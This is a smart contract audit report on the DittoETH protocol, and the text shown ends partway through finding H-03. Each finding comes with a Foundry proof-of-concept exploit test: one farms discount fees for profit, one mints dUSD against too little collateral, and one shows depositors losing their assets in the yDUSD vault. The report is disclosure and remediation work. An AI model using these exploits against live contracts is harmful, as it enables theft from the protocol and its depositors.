---
sponsor: "DittoETH"
slug: "2024-07-dittoeth"
date: "2024-07-29"
title: "DittoETH Invitational"
findings: "https://github.com/code-423n4/2024-07-dittoeth-findings/issues"
contest: 403
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the DittoETH smart contract system written in Solidity. The audit took place between July 5—July 15 2024.

## Wardens

In Code4rena's Invitational audits, the competition is limited to a small group of wardens; for this audit, 4 wardens contributed reports:

  1. [d3e4](https://code4rena.com/@d3e4)
  2. [serial-coder](https://code4rena.com/@serial-coder)
  3. [nonseodion](https://code4rena.com/@nonseodion)
  4. [0xbepresent](https://code4rena.com/@0xbepresent)

This audit was judged by [hansfriese](https://code4rena.com/@hansfriese).

Final report assembled by [liveactionllama](https://twitter.com/liveactionllama).

# Summary

The C4 analysis yielded an aggregated total of 5 unique vulnerabilities. Of these vulnerabilities, 4 received a risk rating in the category of HIGH severity and 1 received a risk rating in the category of MEDIUM severity.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 DittoETH repository](https://github.com/code-423n4/2024-07-dittoeth), and is composed of 25 smart contracts written in the Solidity programming language and includes 3,293 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (4)
## [[H-01] Attacker can profit from discount fees](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/18)
*Submitted by [d3e4](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/18)*

### Impact

It is possible that the amount of dUSD minted in discount fees are greater than the discount loss. An attacker can therefore deliberately trigger a fee and, provided he has a large stake in the yDUSD vault, he can claim more dUSD in fees, than lost from the trade.

The root cause is that the discount fee is fixed in proportion only to the entire debt.

### Proof of Concept

Suppose dUSD trades at the intended 1:1 peg. The effective loss from placing an order at the price 0.95 is then `0.05 * ercAmount`.<br>
Since the difference in price is `>1%` the discount fee kicks in.<br>
`discountPct` is first calculated to `0.05`. Then, after applying the `discountMultiplier` (10 by default) it will be `0.5 * daysElapsed`.<br>
If sufficiently many days have passed the `discount` will thus be an arbitrarily high number `k`.<br>
`pctOfDiscountedDebt` will be `k * ercAmount / ercDebt`. This must be `>0.01` for the fee to be applied. I.e. `ercAmount = 0.01 * ercDebt / k` (or slightly more) is sufficient.<br>
The loss is then `0.0005 * ercDebt / k`.

The `discountPenaltyFee` is `0.1%` and is applied to (almost) the entire `ercDebt`. This, `0.001 * ercDebt` is the amount dUSD minted.

The question is then whether the loss `0.0005 * ercDebt / k` can be smaller than the `0.001 * ercDebt` minted. This will happen if `k > 0.5`, for which two days is sufficient.

```solidity
function _matchIsDiscounted(MTypes.HandleDiscount memory h) external onlyDiamond {
    STypes.Asset storage Asset = s.asset[h.asset];
    uint32 protocolTime = LibOrders.getOffsetTime();
    Asset.lastDiscountTime = protocolTime;
    // @dev Asset.initialDiscountTime used to calculate multiplier for discounts that occur nonstop for days (daysElapsed)
    if (Asset.initialDiscountTime <= 1 seconds) {
        // @dev Set only during first discount or when discount had been previously reset
        Asset.initialDiscountTime = protocolTime;
    }
    // @dev Cap the discount at 5% to prevent malicious attempt to overly increase ercDebt
    uint256 discountPct = LibOrders.min((h.savedPrice - h.price).div(h.savedPrice), 0.05 ether);
    // @dev Express duration of discount in days
    uint32 timeDiff = (protocolTime - Asset.initialDiscountTime) / 86400 seconds;
    uint32 daysElapsed = 1;
    if (timeDiff > 7) {
        // @dev Protect against situation where discount occurs, followed by long period of inactivity on orderbook
        Asset.initialDiscountTime = protocolTime;
    } else if (timeDiff > 1) {
        daysElapsed = timeDiff;
    }
    // @dev Penalties should occur more frequently if discounts persist many days
    // @dev Multiply discountPct by a multiplier to penalize larger discounts more
    discountPct = (discountPct * daysElapsed).mul(LibAsset.discountMultiplier(Asset));
    uint256 discount = 1 ether + discountPct;
    Asset.discountedErcMatched += uint104(h.ercAmount.mul(discount)); // @dev(safe-cast)
    uint256 pctOfDiscountedDebt = Asset.discountedErcMatched.div(h.ercDebt);
    // @dev Prevent Asset.ercDebt != the total ercDebt of SR's as a result of discounts penalty being triggered by forcedBid
    if (pctOfDiscountedDebt > C.DISCOUNT_THRESHOLD && !LibTStore.isForcedBid()) {
        // @dev Keep slot warm
        Asset.discountedErcMatched = 1 wei;
        uint64 discountPenaltyFee = uint64(LibAsset.discountPenaltyFee(Asset));
        Asset.ercDebtRate += discountPenaltyFee;
        // @dev TappSR should not be impacted by discount penalties
        STypes.ShortRecord storage tappSR = s.shortRecords[h.asset][address(this)][C.SHORT_STARTING_ID];
        tappSR.ercDebtRate = Asset.ercDebtRate;
        uint256 ercDebtMinusTapp = h.ercDebt - Asset.ercDebtFee;
        if (tappSR.status != SR.Closed) {
            ercDebtMinusTapp -= tappSR.ercDebt;
        }
        // @dev Increase global ercDebt to account for the increase debt owed by shorters
        uint104 newDebt = uint104(ercDebtMinusTapp.mul(discountPenaltyFee));
        Asset.ercDebt += newDebt;
        Asset.ercDebtFee += uint88(newDebt); // should be uint104?

        // @dev Mint dUSD to the yDUSD vault for
        // Note: Does not currently handle mutli-asset
        IERC20(h.asset).mint(s.yieldVault[h.asset], newDebt);
    }
}
```

**[ditto-eth (sponsor) disputed and commented](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/18#issuecomment-2231895310):**
 > The 7-day waiting period should mitigate this situation because it allows time for other users to join the pool and dilute the would-be attacker. The waiting period in and of itself is a deterrent to attackers because they know that other users can dilute them. This is the reason I added the waiting period instead of allowing for discrete/immediate rewards

**[hansfriese (judge) commented](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/18#issuecomment-2238250934):**
 > Agree with the sponsor.

**[d3e4 (warden) commented](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/18#issuecomment-2241374943):**
 > @ditto-eth @hansfriese - The attacker cannot be diluted. When users deposit they receive shares according to the new increased price. Deposits do not affect how much assets can be claimed by a share. (This is simply how vaults work.) Once the fees are minted to the vault, in which the attacker owns shares, they are accrued to his shares.
> 
> Note again that the root cause is simply that the discount fees are set according to the total debt and not according to how much has been traded at a discount.
> 
> Below is an explicit test case where the attacker causes a discount and triggers \$50,000 in fees by trading \$454,546 at 99% the saved price. This implies a trade loss of \$4,545.46 for the attacker.<br>
> In the example, the attacker initially owns only half of the shares in the fee vault, and before he can withdraw other users deposit lots of funds in the vault. The test case demonstrates that this has no effect on his gains.<br>
> The attacker's realized profit is thus \$20,454.54.
> 
> This example is far from optimal for the attacker. Had he owned all of the vault shares he would obviously gain all of the fees. And I have assumed he would suffer the full trading loss from selling cheap, whereas he could possibly manage to trade with himself, which would eliminate this trade loss.
> 
> In order to prevent this the fees minted cannot be greater than the implied trade loss.<br>
> I suppose the crux here is trying to maintain the peg, regardless of the volume of the discounted trades, which runs counter to this limit imposed on the fees. I'm not sure how the economical forces would regulate this despite low fees on low volume. Maybe a subset of ShortRecords (lowest CR) could be targeted such that the total fees are kept low, while the deterrence "interest" is concentrated to the same high rate on this subset of ShortRecords.
> 
> Paste the following in `yDUSD.t.sol` and run with `forge test --match-test test_discount_drain`.
> 
> <details>
> 
> ```solidity
> function test_discount_drain() public {
>     // Deal some dUSD to users, the attacker and dilutors.
>     address users = makeAddr("users");
>     address attacker = makeAddr("attacker");
>     address dilutors = makeAddr("dilutors");
>     vm.startPrank(_diamond);
>     token.mint(users, 1_000_000 ether);
>     token.mint(attacker, 1_500_000 ether);
>     token.mint(dilutors, 10_000_000 ether);
> 
>     uint256 attackerInitialAssets = token.balanceOf(attacker);
>     assertEq(token.balanceOf(attacker), 1_500_000 ether);
> 
>     // Set up some debt in the system
>     fundLimitBidOpt(DEFAULT_PRICE, ERCDEBTSEED, receiver);
>     fundLimitShortOpt(DEFAULT_PRICE, ERCDEBTSEED, extra);
> 
>     vm.prank(attacker);
>     diamond.depositAsset(asset, 500_000 ether); // The attacker needs to escrow for his ask.
>     
>     STypes.ShortRecord memory tappSR = getShortRecord(tapp, C.SHORT_STARTING_ID);
>     uint104 ercDebtMinusTapp = diamond.getAssetStruct(asset).ercDebt - tappSR.ercDebt;
>     assertEq(ercDebtMinusTapp, 50_000_000 ether);
>     assertEq(diamond.getAssetStruct(asset).lastDiscountTime, 0);
>     assertEq(diamond.getAssetStruct(asset).initialDiscountTime, 1 seconds);
> 
>     // Let's say the yDUSD vault is already in use before the attack, with 1_000_000 ether dUSD already deposited.
>     vm.startPrank(users);
>     token.approve(address(rebasingToken), 1_000_000 ether);
>     rebasingToken.deposit(1_000_000 ether, users);
>     assertEq(rebasingToken.totalAssets(), 1_000_000 ether);
>     assertEq(rebasingToken.balanceOf(users), 1_000_000 ether);
> 
>     // The attacker gets yDUSD shares.
>     vm.startPrank(attacker);
>     token.approve(address(rebasingToken), 1_000_000 ether);
>     rebasingToken.deposit(1_000_000 ether, attacker);
>     uint256 preAttackTotalAssets = rebasingToken.totalAssets();
>     assertEq(preAttackTotalAssets, 2_000_000 ether);
>     assertEq(rebasingToken.balanceOf(attacker), 1_000_000 ether); // The attacker owns half of the shares in this example.
> 
>     // The attacker causes a discount by asking for only 99% of the saved price on 454_546 ether dUSD.
>     // This implies a trade loss of 0.01 * 454_546 ether = 4_545.46 ether dUSD.
>     uint80 savedPrice = uint80(diamond.getProtocolAssetPrice(asset));
>     uint80 askPrice = uint80(savedPrice.mul(0.99 ether));
>     uint80 bidPrice = uint80(savedPrice.mul(0.99 ether));
>     fundLimitBidOpt(bidPrice, 1_000_000 ether, receiver);
>     MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, askPrice, O.LimitAsk, 1);
>     createAsk(askPrice, 454_546 ether, C.LIMIT_ORDER, orderHintArray, attacker); // 0.01 * 50_000_000 / (1 + 10 * 0.01) ≈ 454_546
> 
>     // However, the yDUSD vault has been minted 50_000 ether dUSD in fees, of which half can be claimed by the attacker.
>     assertEq(rebasingToken.totalAssets() - preAttackTotalAssets, 50_000 ether);
>     assertEq(rebasingToken.convertToAssets(rebasingToken.balanceOf(attacker)), 1_000_000 ether + 25_000 ether - 1);
> 
>     // Trading back to normal, which removes the discount.
>     // The attacker can trade back his ethEscrow for dUSD and withdraw his ercEscrow (just for profit accounting).
>     orderHintArray = diamond.getHintArray(asset, savedPrice, O.LimitAsk, 1);
>     createAsk(savedPrice, 1_000_000 ether, C.LIMIT_ORDER, orderHintArray, receiver);
>     limitBidOpt(savedPrice, 4000 * diamond.getVaultUserStruct(vault, attacker).ethEscrowed, attacker);
>     vm.startPrank(attacker);
>     diamond.withdrawAsset(asset, diamond.getAssetUserStruct(asset, attacker).ercEscrowed);
> 
>     // Others deposit before the attacker can propose a withdrawal.
>     vm.startPrank(dilutors);
>     token.approve(address(rebasingToken), 5_000_000 ether);
>     rebasingToken.deposit(5_000_000 ether, dilutors);
>     assertEq(rebasingToken.totalAssets(), 7_050_000 ether);
> 
>     // The attacker wants to claim his profit.
>     skip(5 minutes);
>     vm.startPrank(attacker);
>     rebasingToken.proposeWithdraw(1_025_000 ether);
> 
>     // Others deposit before the attacker can withdraw.
>     vm.startPrank(dilutors);
>     token.approve(address(rebasingToken), 5_000_000 ether);
>     rebasingToken.deposit(5_000_000 ether, dilutors);
>     assertEq(rebasingToken.totalAssets(), 12_050_000 ether);
> 
>     // This actually makes no difference to the attacker's share of the vault, because of how vaults work.
>     assertEq(rebasingToken.convertToAssets(rebasingToken.balanceOf(attacker)), 1_025_000 ether);
> 
>     // The attacker can withdraw later.
>     skip(7 days);
>     vm.startPrank(attacker);
>     rebasingToken.withdraw(0, attacker, attacker);
> 
>     // The attacker has gained 25_000 ether dUSD at a cost of 4_545.46 ether dUSD, i.e. a profit of 20_454.54 ether dUSD.
>     assertEq(token.balanceOf(attacker) - attackerInitialAssets, 20_454.54 ether);
> }
> ```
> 
> </details>

**[hansfriese (judge) commented](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/18#issuecomment-2244390624):**
 > I was able to execute the POC and confirm its validity.<br>
> High is appropriate because an attacker can receive more discount fees than his actual loss.

**[ditto-eth (sponsor) commented](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/18#issuecomment-2245764678):**
 > This is valid, good find!


***

## [[H-02] `DUSD` assets can be minted with less `ETH` collateral than required](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/8)
*Submitted by [serial-coder](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/8), also found by [0xbepresent](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/11)*

### Summary

I discovered that the current implementation has not fixed the issue [H-03 (Users can mint DUSD with less collateral than required which gives them free DUSD and may open a liquidatable position)](https://github.com/code-423n4/2024-03-dittoeth-findings/issues/134) raised in the previous C4 audit.

### Description

To mint the `DUSD` assets with less collateral than required, a user or attacker executes the `OrdersFacet::cancelShort()` to cancel the `shortOrder` with its `shortRecord.ercDebt` < `minShortErc` (i.e., `shortRecord.status` == `SR.PartialFill`).

The `OrdersFacet::cancelShort()` will [execute another internal function, `LibOrders::cancelShort()`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/facets/OrdersFacet.sol#L60) (`@1` in the snippet below), to do the short canceling job. If the `shortOrder`'s corresponding `shortRecord.status` == `SR.PartialFill` and has `shortRecord.ercDebt` < `minShortErc`, the steps [`@2.1`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L944) and [`@2.2`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L946) will get through.

Since the `shortRecord` is less than the `minShortErc`, the `cancelShort()` has to fill an `ercDebt` for more to reach the `minShortErc` threshold (so that the partially filled `shortRecord.ercDebt` will == `minShortErc`). Specifically, the function has to virtually mint the `DUSD` assets to increase the `ercDebt` by spending the `shortRecord.collateral` (Let's name it the `collateralDiff`) for exchange.

Here, we come to the root cause in [`@3`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L953). To calculate the `collateralDiff`:

1.  The `shortOrder.price` is used instead of the current price. Nevertheless, the `shortOrder.price` can be stale (less or higher than the current price).
2.  The `shortOrder.shortOrderCR` (i.e., the `cr` variable in the snippet below) is used, which can be less than 100% CR.

If the `shortOrder.price` is less than the current price and/or the `shortOrder.shortOrderCR` is less than 100% CR, the calculated `collateralDiff` will have a value less than the value of the `DUSD` assets that get minted ([`@4`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L960)).

```solidity
    // FILE: https://github.com/code-423n4/2024-07-dittoeth/blob/main/contracts/facets/OrdersFacet.sol
    function cancelShort(address asset, uint16 id) external onlyValidAsset(asset) nonReentrant {
        STypes.Order storage short = s.shorts[asset][id];
        if (msg.sender != short.addr) revert Errors.NotOwner();
        if (short.orderType != O.LimitShort) revert Errors.NotActiveOrder();

        //@audit @1 -- Execute the cancelShort() to cancel the shortOrder with 
        //             its shortRecord.ercDebt < minShortErc (SR.PartialFill).
@1      LibOrders.cancelShort(asset, id);
    }

    // FILE: https://github.com/code-423n4/2024-07-dittoeth/blob/main/contracts/libraries/LibOrders.sol
    function cancelShort(address asset, uint16 id) internal {
        ...

        if (shortRecord.status == SR.Closed) {
            ...
@2.1    } else { //@audit @2.1 -- shortRecord.status == SR.PartialFill

            uint256 minShortErc = LibAsset.minShortErc(Asset);
@2.2        if (shortRecord.ercDebt < minShortErc) { //@audit @2.2 -- shortRecord.ercDebt < minShortErc

                // @dev prevents leaving behind a partially filled SR under minShortErc
                // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
                uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
                {
                    STypes.Vault storage Vault = s.vault[vault];

                    //@audit @3 -- To calculate the collateralDiff:
                    //             1) The shortOrder.price is used instead of the current price.
                    //                 -> The shortOrder.price can be stale (less or higher than the current price).
                    //
                    //             2) The shortOrder.shortOrderCR (i.e., cr) is used, which can be less than 100% CR.
@3                  uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);

                    LibShortRecord.fillShortRecord(
                        asset,
                        shorter,
                        shortRecordId,
                        SR.FullyFilled,
@4                      collateralDiff, //@audit @4 -- The collateralDiff's value can be less than the value of the DUSD assets that get minted.
                        debtDiff,
                        Asset.ercDebtRate,
                        Vault.dethYieldRate,
                        0
                    );

                    Vault.dethCollateral += collateralDiff;
                    Asset.dethCollateral += collateralDiff;
                    Asset.ercDebt += debtDiff;

                    // @dev update the eth refund amount
                    eth -= collateralDiff;
                }
                // @dev virtually mint the increased debt
                s.assetUser[asset][shorter].ercEscrowed += debtDiff;
            } else {
                ...
            }
        }

        ...
    }
```

*   `@1`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/facets/OrdersFacet.sol#L60>
*   `@2.1`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L944>
*   `@2.2`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L946>
*   `@3`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L953>
*   `@4`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L960>

### Impact

Users or attackers can mint the `DUSD` assets with less `ETH` collateral than required (i.e., free money). This vulnerability is critical and can lead to the de-pegging of the `DUSD` token.

### Proof of Concept

This section provides a coded PoC.

Place the `test_MintFreeDUSD()` and `test_MintBelowPrice()` in the `.test/Shorts.t.sol` file and declare the following `import` directive at the top of the test file: `import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";`.

There are two test functions. Execute the commands:

1.  `forge test -vv --mt test_MintFreeDUSD`
2.  `forge test -vv --mt test_MintBelowPrice`

`PoC #1` shows we can mint the free `DUSD` by canceling the `shortOrder` with the `shortOrderCR` < 100%. For `PoC #2`, we can mint the free `DUSD` by canceling the `shortOrder` with the `price` < the current price.

*Note: in the current codebase, the developer has improved how to source more collateral if the `CR` < `initialCR` in the `createLimitShort()`. For this reason, I had to modify the original test functions developed by `nonseodion` to make them work again. Thanks to `nonseodion`.*

<details>

```solidity
// Require: import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";

// Credit:
//  - Original by: nonseodion
//  - Modified by: serial-coder
function test_MintFreeDUSD() public { // PoC #1
    // Set the initial, penalty and liquidation CRs
    vm.startPrank(owner);
    // Set below 200 to allow shorter provide less than 100% of debt
    diamond.setInitialCR(asset, 170); 
    diamond.setPenaltyCR(asset, 120);
    diamond.setLiquidationCR(asset, 150);
    vm.stopPrank();

    // Create a bid to match the short and change its state to SR.PartialFill
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);

    // How to calculate the ethInitial:
    //      minEth = price.mul(minShortErc);
    //      diffCR = initialCR - CR;
    //      ethInitial = minEth.mul(diffCR);
    uint88 ethInitial = 2000 ether;

    // Create the short providing only 70% of the dusd to be minted
    uint88 price = 1 ether;
    depositEth(sender, price.mulU88(5000 ether).mulU88(0.7 ether) + ethInitial);
    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 70);

    STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
    // Successfully matches the bid
    assertTrue(short.status == SR.PartialFill);
    
    // Cancel the short to use up collateral provided and mint dusd
    vm.prank(sender);
    cancelShort(101);

    short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
    assertEq(short.collateral, 0.01 ether + 0.7 * 2000 ether + ethInitial); // 70% of ETH collateral provided

    // The position is no longer liquidatable because the developer has improved 
    // how to source more collateral if CR < initialCR in the createLimitShort().
    // However, we can still use the CR of 70% to calculate the collateral
    // whose value is less than the value of DUSD that gets minted.
}

// Credit:
//  - Original by: nonseodion
//  - Modified by: serial-coder
function test_MintBelowPrice() public { // PoC #2
    // Create a bid to match the short and change its state to SR.PartialFill
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);

    // Create the short providing 500% of the dusd to be minted
    // Current initialCR is 500%
    uint88 price = 1 ether;
    depositEth(sender, price.mulU88(5000 ether).mulU88(5 ether));
    uint16[] memory shortHintArray = setShortHintArray();
    MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
    vm.prank(sender);
    diamond.createLimitShort(asset, uint80(price), 5000 ether, orderHintArray, shortHintArray, 500);

    STypes.ShortRecord memory short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertTrue(short.status == SR.PartialFill); // CR is partially filled by bid
    
    // Set the new price to 1.5 ether so that price increase
    uint256 newPrice = 1.5 ether;
    skip(15 minutes);
    ethAggregator.setRoundData(
        92233720368547778907 wei, int(newPrice.inv()) / ORACLE_DECIMALS, block.timestamp, block.timestamp, 92233720368547778907 wei
    );
    fundLimitBidOpt(1 ether, 0.01 ether, receiver);
    assertApproxEqAbs(diamond.getProtocolAssetPrice(asset), newPrice, 15000000150);

    // Cancel the short to mint at 1 ether instead of 1.5 ether
    vm.prank(sender);
    cancelShort(101);

    short = getShortRecord(sender, C.SHORT_STARTING_ID);
    assertEq(short.ercDebt, 2000 ether); // 2000 dusd minted
    // 2000 dusd minted for 10000 ether (500% at price of 1 ether) 
    // instead of 15000 ether (500% at price of 1.5 ether)
    assertEq(short.collateral, 0.01 ether + 5*2000 ether);

    // Position is liquidatable
    assertGt( diamond.getAssetNormalizedStruct(asset).liquidationCR, short.collateral.div(short.ercDebt.mul(1.5 ether)));
}
```

</details>

### Recommended Mitigation Steps

When calculating the `collateralDiff`:

1.  Use the current price instead of the `shortOrder.price`.
2.  If the `shortOrder.shortOrderCR` < `initialCR`, use the `initialCR` as the collateral ratio instead of the `shortOrder.shortOrderCR`.

*Note: I have slightly modified the original recommended code of `nonseodion` to make it work with the current codebase. Thanks to `nonseodion` again.*

```diff
    // Credit:
    //  - Original by: nonseodion
    //  - Modified by: serial-coder
    function cancelShort(address asset, uint16 id) internal {
        ...

        if (shortRecord.status == SR.Closed) {
            ...
        } else {
            uint256 minShortErc = LibAsset.minShortErc(Asset);
           if (shortRecord.ercDebt < minShortErc) { 
                // @dev prevents leaving behind a partially filled SR under minShortErc
                // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
                uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
                {
                    STypes.Vault storage Vault = s.vault[vault];

-                   uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);
+                   uint256 newCR = convertCR(
+                       shortOrder.shortOrderCR < s.asset[asset].initialCR ? s.asset[asset].initialCR : shortOrder.shortOrderCR
+                   );
+                   uint80 price = uint80(LibOracle.getSavedOrSpotOraclePrice(asset));
+                   uint88 collateralDiff = price.mulU88(debtDiff).mulU88(newCR);

                    LibShortRecord.fillShortRecord(
                        asset,
                        shorter,
                        shortRecordId,
                        SR.FullyFilled,
                        collateralDiff,
                        debtDiff,
                        Asset.ercDebtRate,
                        Vault.dethYieldRate,
                        0
                    );

                    Vault.dethCollateral += collateralDiff;
                    Asset.dethCollateral += collateralDiff;
                    Asset.ercDebt += debtDiff;

                    // @dev update the eth refund amount
                    eth -= collateralDiff;
                }
                // @dev virtually mint the increased debt
                s.assetUser[asset][shorter].ercEscrowed += debtDiff;
            } else {
                ...
            }
        }

        ...
    }
```

**[ditto-eth (sponsor) confirmed via duplicate issue \#11](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/11#event-13527360994)**

*Note: see [original submission](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/8) for full discussion.*


***

## [[H-03] Incorrect accounting bug of the `yDUSD` vault leads to total loss of depositors' `DUSD` assets](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/7)
*Submitted by [serial-coder](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/7), also found by [d3e4](https://github.com/code-423n4/2024-07-dittoeth-findings/issues/17)*

### Summary

The current implementation of the `yDUSD` vault does not properly support the auto-compounding token rewards mechanism by directly minting the `DUSD` assets to the vault.

Due to an incorrect accounting bug of the vault's total supply (shares), depositors can lose some deposited `DUSD` assets (principal) or even all the assets when the `Ditto` protocol mints `DUSD` debts to the vault to account for any discounts.

### Description

When the match price is below the oracle price, the `OrdersFacet::_matchIsDiscounted()` will be invoked to account for a discount [by minting the discount (`newDebt`)](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/facets/OrdersFacet.sol#L178) (`@1` in the snippet below) to the `yDUSD` vault.

Assuming the `yDUSD` vault is empty (i.e., both `totalAssets` and `totalSupply` are 0), for simplicity's sake. This step will increase the vault's total `DUSD` assets (`totalAssets` -- spot balance) without updating the vault's total supply (`totalSupply` -- tracked shares).

```solidity
    function _matchIsDiscounted(MTypes.HandleDiscount memory h) external onlyDiamond {
        ...

        if (pctOfDiscountedDebt > C.DISCOUNT_THRESHOLD && !LibTStore.isForcedBid()) {
            ...

            // @dev Increase global ercDebt to account for the increase debt owed by shorters
            uint104 newDebt = uint104(ercDebtMinusTapp.mul(discountPenaltyFee));
            Asset.ercDebt += newDebt;
            Asset.ercDebtFee += uint88(newDebt); // should be uint104?

            // @dev Mint dUSD to the yDUSD vault for
            // Note: Does not currently handle mutli-asset
@1          IERC20(h.asset).mint(s.yieldVault[h.asset], newDebt);
                //@audit @1 -- When the match price is below the oracle price, the _matchIsDiscounted()
                //             will be invoked to account for a discount by minting the discount (newDebt)
                //             to the yDUSD vault.
                //
                //             Assuming that the yDUSD vault is empty (i.e., totalAssets and totalSupply are 0), 
                //             for simplicity's sake.
                //
                //             This step will increase the vault's total DUSD assets (totalAssets -- spot balance)
                //             without updating the vault's total supply (totalSupply -- tracked shares).
        }
    }
```

*   `@1`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/facets/OrdersFacet.sol#L178>

After `@1`, when a user deposits their `DUSD` assets to the `yDUSD` vault, the [`ERC4626::previewDeposit()`](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L69) (`@2` in the snippet below) will be executed to calculate the shares based on the deposited assets.

An incorrect accounting bug of the vault's total supply (tracked shares) occurs in `@1` above. In this example, the calculated shares will be 0 since the `totalSupply` is 0 (if the `totalSupply` != 0, the calculated shares can be less than expected). For more details, refer to `@2.1` below.

Since the calculated shares == 0, the user [will receive 0 shares and lose all deposited `DUSD` assets](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L72) (`@3`). Even the [slippage protection check](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L77) (`@4`) cannot detect the invalid calculation due to the `slippage.mul(shares)` == 0, and the user's tracked shares remain unchanged. *(Actually, I discovered another issue regarding the slippage protection check, which will be reported separately.)*

```solidity
    function deposit(uint256 assets, address receiver) public override returns (uint256) {
        if (assets > maxDeposit(receiver)) revert Errors.ERC4626DepositMoreThanMax();

        //@audit @2 -- After @1, when a user deposits their DUSD assets to the yDUSD vault, the previewDeposit()
        //             will be executed to calculate the shares based on the deposited assets.
        //
        //             Due to an incorrect accounting bug of the vault's total supply (tracked shares) occurs in @1,
        //             the calculated shares, in this case, will be 0 since totalSupply is 0 (if totalSupply != 0, 
        //             the calculated shares can be less than expected). For more details, refer to @2.1.
@2      uint256 shares = previewDeposit(assets);

        uint256 oldBalance = balanceOf(receiver);
        //@audit @3 -- Since the calculated shares == 0, the user will receive 0 shares. Thus, they will lose all
        //             deposited DUSD assets.
@3      _deposit(_msgSender(), receiver, assets, shares);
        uint256 newBalance = balanceOf(receiver);

        // @dev Slippage is likely irrelevant for this. Merely for preventative purposes
        uint256 slippage = 0.01 ether;
@4      if (newBalance < slippage.mul(shares) + oldBalance) revert Errors.ERC4626DepositSlippageExceeded();
            //@audit @4 -- Even the slippage protection check above cannot detect the invalid calculation since
            //             the slippage.mul(shares) == 0, and the user's tracked shares remain unchanged.

        return shares;
    }
```

*   `@2`: <https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/tokens/yDUSD.sol#L69>
